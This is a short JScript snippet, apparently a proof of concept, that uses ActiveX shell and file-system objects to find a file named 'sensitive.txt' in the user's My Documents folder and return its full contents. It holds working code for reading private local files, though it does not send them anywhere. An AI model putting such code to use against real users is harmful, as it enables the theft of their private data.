var objShell = new ActiveXObject("shell.application");
var objFolder;
var ssf = 5;
      
objFolder = objShell.NameSpace(ssf);
objFolderItems = objFolder.Items();
var fils = objFolderItems.Count;
for (var i=0; i<fils; i++)
	{
	if (objFolderItems.Item(i).Name == "sensitive.txt")
		{
		var flditm = objFolderItems.Item(i);
    		var fldItmPath = flditm.Path;
		}
	}
var fso = new ActiveXObject("Scripting.FileSystemObject");
var file = fso.GetFile(fldItmPath);
var ts = file.OpenAsTextStream(1,-2);
var s = ts.ReadAll();
return(s);
